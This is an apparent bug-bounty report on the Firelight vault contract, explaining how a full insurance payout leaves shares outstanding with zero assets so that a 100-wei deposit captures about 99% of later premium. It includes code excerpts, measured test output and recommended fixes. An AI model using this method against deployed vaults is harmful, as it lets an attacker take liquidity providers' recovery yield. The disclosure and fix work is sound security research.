# 88416 sc medium post payout share price collapse in firelightvault payout lets an unprivileged 100 wei deposit capture 99 of the slashed lps subsequent premium leading to theft of unclaimed&#x20;

**Submitted on Aug 13th 2026 at 04:05:01 UTC by @basedfk for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88416
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Bug Description

### Brief/Intro

`FirelightVault.payout` transfers assets out without burning any shares, so a payout that consumes the vault's whole active balance leaves the vault at `totalAssets() == 0` while `totalSupply()` stays at its pre-payout value; `IncidentManager.approveCurrentAssessment` executes that payout and re-opens deposits in the same transaction. In that state `_convertToSharesTotals` degenerates to `assets * (totalSupply + 1)`, so the next depositor buys shares at an effectively zero price: in the end-to-end PoC an unprivileged account deposits **100 wei** and receives **99.00%** of total supply. Every subsequent share-less inflow — in particular the premium that `VaultRewardDistributor.distributeRewards` forwards into the vault, which is the mechanism by which slashed LPs are meant to recover — is then split on that ratio. The A/B counterfactual in the PoC measures it directly: with an identical incident and an identical 200,000 fXRP premium distribution, the slashed LPs recover **200,000 fXRP** when no attacker acts and **1,980 fXRP** when one does, with **198,019 fXRP** going to the account that risked 100 wei.

**This does not depend on an excessive, duplicate, or invalid claim.** `IncidentManager` caps every assessment loss line against the cover actually sold, on-chain, at [IncidentManager.sol#L352-L354](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L352-L354). The full drain needs only a valid claim sized inside the cover the allocator legitimately permitted. See "Answering Firelight's known issue #3" below — that section is the first thing a triager will want, so it is placed early rather than buried.

### Details

Three separately-correct behaviours compose into the exploit.

**1. `payout()` moves assets but never touches share supply.**

`FirelightVault.payout` is [L892-L966](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L892-L966). It contains no `_burn`, no `_update`, and no write to `totalSupply` — the only share-supply mutation in the entire file is `_update(owner, address(0), shares)` at [L1025](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1025), inside `_requestWithdraw`. (`_mint` is reached only through OZ's `_deposit`, called from `_depositFunds` at [L989](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L989).)

The amount paid is capped at [L926-L927](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L926-L927):

```solidity
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

and split across sources at [L935-L938](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L935-L938):

```solidity
if (_currentPeriod == capturePeriod) {
    uint256 payableAmount = currentActiveAssets + capturePeriodWithdrawals;
    paidFromActive = paidAmount.mulDiv(currentActiveAssets, payableAmount);
    paidFromCaptureWithdrawals = paidAmount - paidFromActive;
}
```

With empty withdrawal buckets, `capturePeriodWithdrawals == 0`, so `payableAmount == currentActiveAssets == X` and `paidAmount == X`; therefore `paidFromActive = X.mulDiv(X, X) == X` **exactly**, and [L952](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L952) checkpoints `currentActiveAssets - paidFromActive == 0`. `totalAssets()` ([L427-L429](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L427-L429)) then reads exactly `0`, with every LP share still outstanding.

One precision point that matters for correctness of the claim: `totalAssets() == 0` is **not** the same as the vault's ERC-20 balance being zero, because `totalAssets()` is `super.totalAssets() - pendingWithdrawAssets`. Assets already reserved for claimable withdrawals can still sit in the contract. The share-price degeneracy keys off `totalAssets()`, so `totalAssets()` is the quantity that matters — but the claim is about that accounting value, not about the token balance.

This state is not hypothetical to the project either: the repository's own `test/vault_payout.js:76` already asserts `totalAssets() == 0` after a maximal payout. It simply never deposits afterwards.

**2. The share conversion degenerates at `totalAssets() == 0`.**

[L1058-L1065](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1058-L1065):

```solidity
function _convertToSharesTotals(
    uint256 assets,
    uint256 totSupply,
    uint256 totAssets,
    Math.Rounding rounding
) private view returns (uint256) {
    return assets.mulDiv(totSupply + 10 ** _decimalsOffset(), totAssets + 1, rounding);
}
```

`_decimalsOffset()` has **no override anywhere under `contracts/`** — `grep -rn "function _decimalsOffset" contracts/` returns nothing — so it resolves to OpenZeppelin `ERC4626Upgradeable._decimalsOffset()`, which returns `0` (`@openzeppelin/contracts-upgradeable@5.4.0`, `ERC4626Upgradeable.sol:301-303`, the version pinned in `package.json`). Within `FirelightVault.sol` it is referenced only at L1064 and L1073. (For completeness, so the grep is reproducible: `contracts/legacy/FirelightVaultPredeposits.sol:856` and `:865` also reference it, with the same resolution. The legacy contract is not part of this report.)

The virtual-share cushion is therefore the bare `+1`. With `totAssets == 0` the expression collapses to `assets * (totalSupply + 1)`, so a depositor of `D` base units mints `D * (S + 1)` shares against an existing supply of `S`, taking a fraction `D(S+1) / (S + D(S+1))` \~= `D / (D + 1)` of the vault for `D` wei.

The `shares == 0` guard the developers added in `deposit` at [L667-L669](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L667-L669):

```solidity
// A dust deposit can floor to zero shares once the share price exceeds 1;
// reject it instead of pulling assets in exchange for nothing.
if (shares == 0) revert InvalidAmount();
```

is structurally inert here. It defends the **classic** ERC-4626 inflation direction (`assets > 0`, `supply == 0`), which is exactly what `test/donations.js` tests. This is the **mirror** state (`assets == 0`, `supply > 0`), where the minted share count is astronomically **large**, not zero, so the guard never fires. See "Not a duplicate of `test/donations.js`" below.

**3. The drain and the deposit re-open happen in one transaction.**

`IncidentManager.approveCurrentAssessment` ([L403-L439](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L403-L439)) calls `_executePayout` (which reaches `$.vault.payout(...)` at [L684](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L684)) and then `_decreaseIncident(incident.period)` ([L436](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L436)), which calls `$.vault.setActiveIncident(period, false)` at [L829](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L829). `FirelightVault.setActiveIncident` ([L510-L513](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L510-L513)) clears `hasActiveIncident[period]`, which is what `deposit`'s `_hasActiveIncident()` gate at [L660](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L660) reads. After the drain, `maxDeposit` ([L371-L378](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L371-L378)) returns `depositLimit - 0 == depositLimit`, i.e. the full deposit window.

**I want to be precise about what is and is not atomic here, because the report should not be read as claiming more than it proves.** The *flag lifecycle* is atomic: the vault is emptied and deposits are re-opened inside a single `approveCurrentAssessment` call, with no reset step in between. The **attacker still acts in the following transaction** — there is no attacker insertion point inside `approveCurrentAssessment`. That is sufficient, because the post-payout state is a public, unguarded, first-come-first-served opportunity that any mempool observer wins, but it is a race and not an atomic bundle, and I am not claiming otherwise.

Two narrowings on the same point, both in the project's favour and both stated here rather than left for a triager to find:

* `_decreaseIncident` clears the flag only when the period's incident count reaches `0` ([L819-L831](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L819-L831)), and `_hasActiveIncident()` ([L1115-L1118](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1115-L1118)) checks the current **and** previous period. So any other unresolved incident in either period keeps deposits shut until the last one closes. The window opens when the last incident is resolved, not necessarily at the first payout.
* The precondition is a full-or-near-full drain of `totalAssets()`, not any partial payout. Precondition 2 in Risk Breakdown states exactly where the residual assets come from and measures the degradation.

**Where the stolen value comes from.**

`VaultRewardDistributor.distributeRewards` ([L132-L153](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/VaultRewardDistributor.sol#L132-L153), `onlyRole(DISTRIBUTOR_ROLE)` at [L137](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/VaultRewardDistributor.sol#L137)) forwards premium proceeds with

```solidity
$.vaultAsset.safeTransferFrom(msg.sender, address(_vault), vaultAssetAmount);
_vault.checkpointTotalAssets();
```

— assets in, **no shares minted**. `distributeIncentive` ([L163-L177](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/VaultRewardDistributor.sol#L163-L177)) does the same. Every such inflow is therefore split on the post-drain share ratio, which the attacker now dominates. This is not limited to the premium for the cover that caused the loss: any share-less inflow — later-period premiums, incentives, or a plain `transfer` into the vault followed by any checkpoint or flow — is captured on the same ratio, until an ordinary-sized deposit restores a sane share price (see the bound in Impact, which is measured).

**Answering Firelight's known issue #3, and `payout()`'s own NatSpec.**

I expect this to be the first rejection attempted, so I am answering it up front rather than waiting to be asked.

The program discloses as a known issue that *"Aggregate claims are not capped on-chain against total cover sold; the MVP relies on trusted incident/assessment roles and the approval process to prevent duplicate, excessive, or otherwise invalid claims."* `payout()`'s own NatSpec says the same thing at [FirelightVault.sol#L884-L886](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L884-L886):

```solidity
 * The vault applies only these per-call limits; ensuring aggregate payouts stay within underwritten exposure
 * is the responsibility of the curator and assessor roles.
```

**This report does not ride on either.** The exploit needs a *single, valid, correctly-sized* claim — not an aggregate overrun, not a duplicate, not an excessive one. Firelight already enforces the per-loss bound on-chain, in `addAssessmentLosses` at [IncidentManager.sol#L347-L356](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L347-L356):

```solidity
// Validate that the order-market allocation exists and the assessment loss amount does not exceed it.
(uint256 orderPeriod, uint256 allocatedCoverAmount, address payoutRecipient) = $
    .coverOrderAllocator
    .getCoverOrderMarketInfo(coverTokenId, marketId);
if (payoutRecipient == address(0)) revert OrderNotFound(coverTokenId, marketId);
if (amount > allocatedCoverAmount) {
    revert AssessmentLossAmountTooBig(coverTokenId, marketId, allocatedCoverAmount, amount);
}
```

and duplicate lines are rejected at [L341-L343](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L341-L343) (`AssessmentLossAlreadyExists`). So the loss the PoC uses is bounded by cover that was actually sold. Concretely, in `test/zz_poc_postdrain_e2e.js` the allocated cover is set to **2x** the vault's assets — exactly the envelope the mock's own `CapacityConfig` implies (`effectiveLeverage = 24000 / minCAR = 12000`) — and the assessed loss is **1x** vault assets, i.e. half of what was legitimately underwritten. Nothing about the claim is excessive.

The disclosed known issue is about *aggregate* exposure across many claims. This is a **single** claim inside a **single** order-market's allocation. If a triager wants to close this as the known issue, the closing argument has to be that a 1x-vault loss against 2x-vault sold cover is itself an invalid claim — which would mean the protocol may never sell more cover than the vault holds, contradicting the leverage design at [CoverOrderAllocator.sol#L719](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L719).

**Not a duplicate of `test/donations.js`.**

`test/donations.js` covers `assets > 0, supply == 0`: an attacker donates first, and a subsequent dust deposit floors to zero shares and is rejected by the L669 guard. That direction is closed and I am not re-reporting it. The state described here is its mirror, `assets == 0, supply > 0`, reached through `payout()` rather than through a donation, where the same guard cannot fire because `shares` is enormous rather than zero. Neither `test/donations.js` nor `test/vault_payout.js` deposits into a drained vault.

**Why an ordinary accounting-invariant check does not catch it.**

No accounting identity is violated at any point: `Sum previewRedeem <= totalAssets()` holds throughout, and the vault remains internally solvent. The harm is purely in the *relative* share split applied to later inflows. That is also why this is filed as theft of unclaimed yield rather than as protocol insolvency.

***

## Impact

**In-scope impact selected: "Theft of unclaimed yield" (High).**

The loss is the slashed LPs' post-incident recovery — the premium already collected for the cover that slashed them, forwarded into the vault by `VaultRewardDistributor` for their benefit, held unclaimed in the vault until they redeem and claim.

Measured end-to-end against the real `IncidentManager`, the real `FirelightVault` and the real `VaultRewardDistributor`, with two LPs holding 1,000,000 fXRP total and a 200,000 fXRP premium distribution (`test/zz_poc_postdrain_e2e.js`, test 2, an A/B run of the identical scenario):

|                  | LP recovery                 | Attacker take               | Attacker cost |
| ---------------- | --------------------------- | --------------------------- | ------------- |
| Without attacker | 200,000 fXRP (200000000000) | —                           | —             |
| With attacker    | 1,980 fXRP (1980198020)     | 198,019 fXRP (198019802080) | 100 wei       |

**99% of the LPs' earned premium is transferred to an account that risked 100 wei.** The counterfactual is the argument: this is not a symmetric redistribution among participants who each took risk, because the attacker's position is created *after* the loss is realised and is sized at 100 wei.

The value is realisable, not notional. In `test/zz_poc_postdrain_dilution.js` test 1 the same scenario is run all the way through `redeem()` -> wait one period -> `claimWithdraw()`, and the measured **actual ERC-20 token movement** is: attacker `+198,019.802080` fXRP, honest LPs `+1,980.198020` fXRP combined, out of a 200,000 fXRP reward. The realised figure equals the `previewRedeem` figure to the wei.

**Bounding the ceiling honestly.** Loss scales with the premium rather than with the attacker's stake, but the \~99% ratio is **not** unbounded in time. The attacker captures \~99% of share-less inflows **that arrive before the next ordinary-sized deposit**. Once a normal deposit lands, the degenerate share price is gone and dilution is proportional again. Measured (`test/zz_poc_postdrain_residue.js`, test 3): starting from the post-attack state (`totalAssets() = 100` wei, `totalSupply() = 101000000000100`), a single **1 fXRP** deposit mints \~1e18 shares and drops the attacker's fraction of supply from **99.01% to 0.0100%**; a later 200,000 fXRP inflow then yields the attacker `19998080` base units (\~20 fXRP) instead of \~198,019. So the realistic ceiling is the premium and incentive flow arriving in the window between the drain and the first ordinary deposit — which, given that the LPs' recovery premium is precisely what is expected to arrive in that window, is exactly the 198,019 fXRP the A/B measures. The attacker's capital at risk is 100 wei (0.0000000000001 fXRP).

The vault's principal is not the loss here. The LP principal was legitimately paid out to a valid claim. What is stolen is the recovery flow that the design intends to recapitalise the surviving share ledger with — which is precisely why "Theft of unclaimed yield" is the correct label rather than a principal-theft or insolvency label.

**One sentence on the Critical alternative, for the panel's information and not as my claim:** a Critical framing under *"Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield"* is arguable, since `redeem()` + `claimWithdraw()` extracts real tokens that belonged to the LPs; I am **not** submitting it at Critical, because the vault stays internally solvent after the attack and what the attacker captures is later share-less inflows rather than principal, which makes "unclaimed yield" the more honest characterisation.

***

## Risk Breakdown

Assessed against the Immunefi Vulnerability Severity Classification System (v2.3) rather than CVSS.

**Attacker privileges required: none.** The attack step is `deposit(100, attacker)` from an arbitrary EOA. No role, no allowlist, no prior position in the vault, no flash loan, no oracle interaction, no interaction with any third-party contract.

**Attacker capital at risk: 100 wei of fXRP**, plus gas. There is no scenario in which the attacker loses more than the dust deposit.

**Scope framing — this is not a privileged-role report.** The Firelight scope page puts out of scope "any bug report that requires a privileged role holder to act within the permissions explicitly granted to that role … unless the report demonstrates that the role can exceed its intended permissions or bypass an intended protocol constraint", and restates it as excluding reports "requiring trusted assessors, approvers, operators, or payout coordinators to make intentionally incorrect business decisions". This report requires neither. Stated precisely:

> After a valid payout executed *within* documented permissions, an unprivileged actor can steal the remaining LPs' post-loss recovery, because the vault is left at `totalSupply > 0, totalAssets == 0` and deposits reopen before any reset.

No role makes an incorrect decision anywhere in the chain. `PAYOUT_ROLE` and `ASSESSMENT_APPROVER_ROLE` are used correctly and honestly throughout; the incident flow in the e2e PoC is driven start to finish through the real `IncidentManager` (`createIncident` -> `confirmIncident` -> `addAssessmentLosses` -> `submitCurrentAssessment` -> `approveCurrentAssessment`) with no shortcuts, and the loss is bounded on-chain by `allocatedCoverAmount` ([IncidentManager.sol#L352-L354](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L352-L354)). The defect is that `FirelightVault` leaves a degenerate share price behind and re-opens deposits into it, and the exploitation is performed by an unprivileged third party against that resulting public state. This is the standard "a legitimate settlement creates a state an external attacker exploits" pattern.

**Precondition 1 — a full-or-near-full drain of `totalAssets()`, inside the protocol's own underwritten exposure envelope.** `CoverOrderAllocator._computeAvailableCapacity` computes capacity at [L696-L725](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L696-L725). The first-loss buffer is folded **into** available collateral *before* the leverage multiply, at [L704-L719](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L704-L719):

```solidity
uint256 availableCollateralCanonical = firstLossBufferUSDCanonical + stakedAssetsValueUSDCanonical;

uint256 strictCapacity = availableCollateralCanonical.mulDiv(config.effectiveLeverage, config.minCAR);
```

with `effectiveLeverage <= MAX_LEVERAGE_FACTOR * minCAR` where `MAX_LEVERAGE_FACTOR = 5` ([L82](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L82), enforced at [L665-L666](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L665-L666)), widened by `divergenceToleranceBps <= 1000` ([L78](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L78), applied at [L721-L724](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L721-L724)) — up to \~5.5x the collateral.

Two consequences, both load-bearing:

1. An assessed loss at or above 1x vault assets is squarely within what the protocol sells, so the full drain is the design's expected tail rather than a contrivance.
2. Because a **funded** first-loss buffer *raises* sellable cover (it is inside `availableCollateralCanonical`) faster than it absorbs loss (it absorbs 1:1), a funded buffer does not make the state unreachable: cover can be sold up to \~5.5x of `FLB + vault assets`, so a claim can exhaust the buffer and still request at least the vault's `totalAssets()`. This is what makes Precondition 3 below a configuration note rather than a load-bearing assumption.

**Precondition 2 — the post-payout residue `R`, where it comes from, and how it degrades the attack.** This is the single most important precondition and I state it affirmatively, including the cases where it kills the attack.

*Where residue comes from.* `paidAmount` is capped by `assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart)` ([L911](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L911), applied at [L926-L927](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L926-L927)). Assets deposited **after** the capture-period start are therefore structurally unslashable and survive the payout as residue. Residue is exactly those deposits. Measured (`test/zz_poc_postdrain_residue.js`, test 2): a 1,000,000 fXRP vault with a 10,000 fXRP mid-period deposit gives `snapshot = 1000000000000`, `live = 1010000000000`, and `residue = 10000000000` after a maximal payout — exactly the mid-period deposit.

*Why `R = 0` is nevertheless the ordinary case.* Deposits are blocked for the entire life of the incident: `deposit` reverts `CurrentPeriodHasActiveIncident` at [L660](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L660), and `_hasActiveIncident()` ([L1115-L1118](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1115-L1118)) covers the current and previous period. The e2e PoC asserts this directly — `maxDeposit == 0` immediately after `createIncident`. So a promptly-filed incident admits **no** post-snapshot deposits and lands on `R = 0`. Residue requires either deposits arriving between the capture-period start and the filing, or the next-period case below.

*Degradation curve.* Measured (`test/zz_poc_postdrain_residue.js`, test 1) on a 1,000,000 fXRP vault (`S = 1e12`) with `D = 100` wei, verbatim from the run:

```
      residue=0    dust=100 -> attacker holds 99.00% of supply, takes 99.00% of a 200000000000 inflow  (S=1000000000000)
      residue=1    dust=100 -> attacker holds 98.03% of supply, takes 98.03% of a 200000000000 inflow  (S=1000000000000)
      residue=10   dust=100 -> attacker holds 90.09% of supply, takes 90.09% of a 200000000000 inflow  (S=1000000000000)
      residue=100  dust=100 -> attacker holds 49.75% of supply, takes 49.75% of a 200000000000 inflow  (S=1000000000000)
      residue=1000 dust=100 -> attacker holds 9.08% of supply, takes 9.08% of a 200000000000 inflow  (S=1000000000000)
```

This is `D / (D + R + 1)`, which is what the closed form predicts. The attacker can restore the ratio by scaling `D` with `R` (the dust-scaling test in File 1 measures `D = 1 / 10 / 100 / 1000` wei at `R = 0` giving 50.00% / 90.90% / 99.00% / 99.90%, the same formula on the other axis). But a payout that leaves a materially non-dust residue makes the required capital scale with that residue and degrades the attack toward ordinary proportional participation. **This is a full-or-near-full-drain claim, not a claim about every partial payout.** With a 10,000 fXRP mid-period deposit as residue, the 100-wei attacker's claim on a 200,000 fXRP premium collapses to **2099 base units (0.002099 fXRP)** — measured, test 2 — i.e. the attack is dead.

*A narrowing that kills it outright, stated because a triager would otherwise find it.* `payout` explicitly permits execution in `capturePeriod + 1` (`_isPeriodInPayoutWindow`, [L903-L907](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L903-L907)), and in that case a whole period of deposits is residue. Measured (`test/zz_poc_postdrain_residue.js`, test 4): with 300,000 fXRP deposited in `capturePeriod + 1`, residue after a maximal payout is `300000000000` and a 100-wei deposit obtains **0.00%** of supply. So the attack requires a payout executed in the capture period itself (or in the following period with negligible intervening deposits).

**Precondition 3 — the first-loss buffer (a PoC configuration note, not a dependency).** The e2e PoC sets the first-loss buffer wallet's balance to `0`, so the whole assessed loss falls on the vault via the `remainderAmount` path in `_executePayout`: `remainderAmount = totalAssessmentLoss` at [L643](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L643), the first-loss leg is gated at [L646](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L646) (`if (flbPayerBalance > 0)`) and therefore skipped, leaving the full remainder for the vault branch at [L672-L690](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L672-L690). With a funded buffer, the loss must exhaust the buffer *and still* request at least the vault's `totalAssets()` — which Precondition 1 shows is inside the capacity the allocator grants precisely *because* the buffer was funded. **The empty first-loss buffer is not the bug and I am not relying on it as one** — the project's known-issues list already covers the buffer being an external, unescrowed wallet, and this report makes no claim about the buffer's funding or approvals. It is stated here only as an honest description of the PoC's configuration.

**The one genuine realism lever, owned rather than hidden.** The loss only crystallises when a `DISTRIBUTOR_ROLE` holder subsequently calls `VaultRewardDistributor.distributeRewards` ([L132-L153](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/VaultRewardDistributor.sol#L132-L153), `onlyRole(DISTRIBUTOR_ROLE)` at [L137](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/VaultRewardDistributor.sol#L137)) into a vault whose `totalSupply()` has visibly jumped \~100x. A triager can fairly ask: would an operator not notice and withhold the premium? Three answers:

1. **Withholding does not restore the LPs.** There is no mechanism anywhere in `FirelightVault` or `VaultRewardDistributor` to route assets to pre-drain holders specifically — every inflow is share-less and accretes on the live ledger. Withholding therefore converts the theft into a denial of the LPs' recovery; it does not undo it. The LPs are out their recovery either way, and the protocol is then holding premium it cannot deliver.
2. **A 100-wei deposit is not a monitorable event.** It emits an ordinary `Deposit`. The observable anomaly is `totalSupply()` in the ledger, not an alert-shaped state change; nothing in the contracts emits a warning, and no on-chain check exists. Expecting an operator to diff total supply before every distribution is a manual control, not a protocol control.
3. **The distribution is the designed happy path.** Forwarding the premium after a settled incident is exactly what the distributor is for. Requiring it to be skipped is requiring the operator to deviate from correct behaviour to avoid the bug.

**Victim class, stated precisely.** The victims are **holders of vault shares at the moment of the drain**. LPs who had already burned their shares into a withdrawal bucket (`_requestWithdraw`, [L994-L1028](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L994-L1028)) hold no shares and do not participate in later inflows either way, so they are not the ones robbed here.

**"But an LP could just win the dust auction themselves."** The degenerate state is symmetric — any address, including an existing LP, can deposit 100 wei — so it is worth saying why this strengthens the report rather than weakening it.

* **LPs cannot pre-position.** Deposits are shut for the entire life of the incident (`deposit` reverts `CurrentPeriodHasActiveIncident` at [L660](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L660); the gate spans the current and previous period at [L1115-L1118](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1115-L1118)). An LP cannot place the defensive dust deposit in advance; the first opportunity is a public mempool race in the block after `approveCurrentAssessment`, against searchers who do this for a living.
* **The victim class is unchanged either way.** Whoever wins the auction captures \~99% of the premium. If an LP wins, that LP takes \~99% of a pot that belonged pro-rata to *all* share-holders at the moment of the drain. Every other slashed LP is robbed identically. A defence that only one participant can exercise, in a race, is not a defence — it is a description of the same theft with a different beneficiary.

**Victims cannot avoid it by exiting, in either direction.**

* *Before* the payout: exiting does not help, because `payout()` draws from the pending withdrawal buckets too — `withdrawAssets[capturePeriod + 1]` is read at [L916](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L916) and folded into `activePayableAmount` at [L926](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L926) — so a queued withdrawal is slashed alongside active assets. This is deliberate, and correct.
* *After* the payout: exiting is self-harm. `previewRedeem` is \~0 in the drained state, so redeeming **destroys** the residual claim rather than realising it; and `redeem()` only queues a withdrawal claimable in a later period ([L717-L744](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L717-L744) -> `_requestWithdraw`, which files the request under `currentPeriod() + 1` at [L1008](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1008); `claimWithdraw` at [L788-L791](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L788-L791) requires `period < currentPeriod()`), so there is no atomic "grab the premium and leave" path. The dust deposit lands the instant the payout confirms; the LPs' next opportunity to act is an entire period later.

**Why shares are deliberately not burned, and why that does not make this an intended loss.** The design's intent is clearly that LPs retain their pro-rata claim after a payout and are recapitalised by incoming premium — that is what `VaultRewardDistributor` exists for and why the share ledger survives the drain. The premium is not ownerless new money: it is the already-collected consideration for the exact cover that just slashed them, and the share ledger is the ownership rule. The bug is that the ownership rule is destroyed by the same operation that creates the need for it.

**Not affected by the "incorrect data supplied by third-party oracles" exclusion.** No oracle behaviour is required. The `MockPriceFeed` in the PoC returns a constant $1.00 and is refreshed only because the test advances a full period past `maxPriceAge`; a stale feed would simply revert. No third-party contract is exercised.

**Difficulty: low**, subject to the preconditions above. The post-payout state is public and observable on-chain; the incident approval transaction is visible in the mempool; the exploit is a single unprivileged `deposit` call in the next block, competing only with other searchers.

***

## Recommendation

The root cause is that the vault permits new deposits while `totalAssets() == 0 && totalSupply() > 0`. Any of the following closes it; the first is the minimal, targeted fix.

**1. Reject deposits into the degenerate state (minimal fix).** In `FirelightVault.deposit` and `FirelightVault.mint`, and mirrored in `maxDeposit`/`maxMint` so the ERC-4626 previews stay consistent:

```solidity
error VaultAssetsDepleted();

// in deposit(), alongside the existing checks at L658-L669
if (totalAssets() == 0 && totalSupply() > 0) revert VaultAssetsDepleted();
```

```solidity
// maxDeposit (L371-L378)
function maxDeposit(address receiver) public view override returns (uint256 amount) {
    uint256 assets = totalAssets();
    if (
        isBlocklisted[receiver] ||
        paused() ||
        _hasActiveIncident() ||
        assets > depositLimit ||
        (assets == 0 && totalSupply() > 0)      // <-- added
    ) {
        return 0;
    }
    return depositLimit - assets;
}
```

This requires an explicit, permissioned recapitalisation/reset step before the vault re-opens, which is the correct operational sequence after a total loss anyway. Note that this alone leaves the vault closed until such a step exists, so it should be paired with a defined recovery path (fix 2 or an explicit re-seed).

**2. Retire residual shares on a full payout.** If `paidFromActive == currentActiveAssets` (the vault's active assets are fully consumed), the surviving share ledger no longer represents a claim on anything. Either burn the outstanding supply as part of the payout and settle LPs against a separate post-loss recovery accounting, or snapshot the ledger and mint against it when recapitalisation arrives. This is the larger change but it removes the degenerate state entirely rather than gating access to it.

**3. Raise `_decimalsOffset()`.** Overriding

```solidity
function _decimalsOffset() internal view virtual override returns (uint8) {
    return 6; // or 8
}
```

widens the virtual-share cushion from `+1` to `10**6`, which raises the cost of capturing a given fraction of a drained vault by six orders of magnitude. This is defence-in-depth and materially reduces the profitability, but it does **not** eliminate the state — with `totalAssets() == 0` the conversion is still `assets * (totalSupply + 10**offset)`, so a sufficiently funded attacker can still dominate. Do not rely on this alone.

A regression test for the mirror direction should be added next to `test/donations.js`: drain the vault via `payout`, then assert that a dust deposit either reverts or cannot obtain a materially disproportionate share.

***

## References

Pinned to the audited commit `v1_audit_ready` (`42f9ea5e43d88b35197b901acc2a8c24b314fa62`). Every line range below was re-checked against the file at that commit before submission.

**`contracts/core/FirelightVault.sol`**

* `payout` NatSpec: "aggregate payouts … responsibility of the curator and assessor roles" — [#L884-L886](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L884-L886)
